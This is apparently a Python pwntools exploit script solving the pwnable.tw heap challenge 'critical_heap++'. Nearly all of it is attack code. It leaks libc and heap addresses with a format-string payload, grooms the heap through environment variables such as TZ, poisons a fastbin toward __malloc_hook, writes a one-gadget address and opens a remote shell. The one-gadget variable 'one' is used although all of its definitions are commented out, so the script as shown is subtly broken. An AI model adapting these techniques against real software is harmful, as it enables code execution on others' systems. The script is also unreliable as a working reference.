from pwn import *

import os

os.environ={
    "PWN":"yes",
    "DDAA":"phd",
    "OLDPWD":"/home",
    "LOGNAME":"critical_heap++",
    "XDG_RUNTIME_DIR":"/run/user/1000",
    "LESSOPEN":"| /usr/bin/lesspipe %s",
    "LANG":"en_US",
    "SHLVL":"1",
    "SHELL":"/bin/bash",
    "ID":"1337",
    "HOSTNAME":"pwnable.tw",
    "MAIL":"/var/mail/critical_heap++",
    "HEAP":"fun",
    "FLAG":"/",
    "ROOT":"/",
    "TCP_PORT":"56746",
    "PORT":"4869",
    "X_PORT":"56746",
    "SERVICE":"critical_heap++",
    "XPC_FLAGS":"0x0",
    "TMPDIR":"/tmp",
    "RBENV_SHELL":"bash",
  
}

def cmd(c):
	p.sendlineafter("choice : ",str(c))
def add(name,tp=1,ct="A"):
	cmd(1)
	p.sendafter("Name of heap:",name)
	cmd(str(tp))
	if tp==1:
		p.sendafter("Content of heap :",ct)
def show(idx):
	cmd(2)
	p.sendlineafter("heap :",str(idx))
def play(idx):
	cmd(4)
	p.sendlineafter("heap :",str(idx))
def play_sys(idx,c=1,name="TZDIR",value='/home/critical_heap++/'):
	cmd(4)
	p.sendlineafter("heap :",str(idx))
	cmd(c)
	if c==1:
		p.sendlineafter("Give me a name for the system heap :",name)
		p.sendafter("Give me a value for this name :",value)
		cmd(5)
	if c==2:
		p.sendlineafter("What's name do you want to unset :",name)
		cmd(5)
def play_time(idx):
	cmd(4)
	p.sendlineafter("heap :",str(idx))
	cmd(2)
	cmd(3)
def reflush_path(idx):
	cmd(4)
	p.sendlineafter("heap :",str(idx))
	cmd(3)
	cmd(5)
def edit(idx,name):
	cmd(3)
	p.sendlineafter("heap :",str(idx))
	p.sendlineafter("heap:",name)
def set_small_bin():
	play_sys(2,1,"TZ",'C'*0x58)
	play_time(1)
	play_sys(2,2,"TZ",'D'*0x40)
	play_time(1)
def free(idx):
	cmd(5)
	p.sendlineafter("heap :",str(idx))
def b():
	log.success(pid)
	raw_input()


#p=process("/home/critical_heap++/critical_heap")
#pid=p.pid
#libc=ELF("/dbg64/lib/libc.so.6")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")
p=remote("chall.pwnable.tw",10500)
#p=remote("0.0.0.0",4869)
add("A\x00",1,"%p%p%p%p%p|%s|")#0
add("a\x00",2)#1
play(0)
cmd(1)
p.readuntil("Content :")
base=int(p.read(14),16)-(0x7ffff7dd3780-0x00007ffff7a0d000)
p.readuntil("|")
heap=u64(p.readuntil("|")[:-1].ljust(8,'\x00'))-0x10
#context.log_level='debug'
log.warning(hex(base))
cmd(3)
add('nierz',3)#2
play_time(1)
play_sys(2,2,'PWD','.')
play_sys(2,1,'PWD','.')
play_sys(2,1,'TZ','A'*0x30)
play_time(1)
play_sys(2,2,'TZ')
play_sys(2,1,'TZ','AaA'*20)
play_time(1)
play_sys(2,1,'EXE','TXT'*2)
play_sys(2,1,"PDF","AVI"*3)
context.log_level='debug'
add("A",3)
reflush_path(3)
log.warning(hex(heap))
add("A"*0x40,1,"A"*0x1)#4
add("B"*0x40,1,"A"*0x1)#5
edit(5,p64(0)*5+p64(0x71)+p64(libc.symbols['__malloc_hook']+base-35))
add("D"*0x60,1,"A"*0x1)#6
add("E"*0x60,1,"A"*0x1)#7
#one=base+0xef6c4 #0xef6c4#0x4526a#0x45216#0x401bf5
#one=base+0xf0567
edit(7,("\x00"*19+p64(one)).ljust(0x60,'\x00'))
cmd(1)
p.sendlineafter("heap:","F**k U!".ljust(0x9f,'\x00'))

p.interactive()

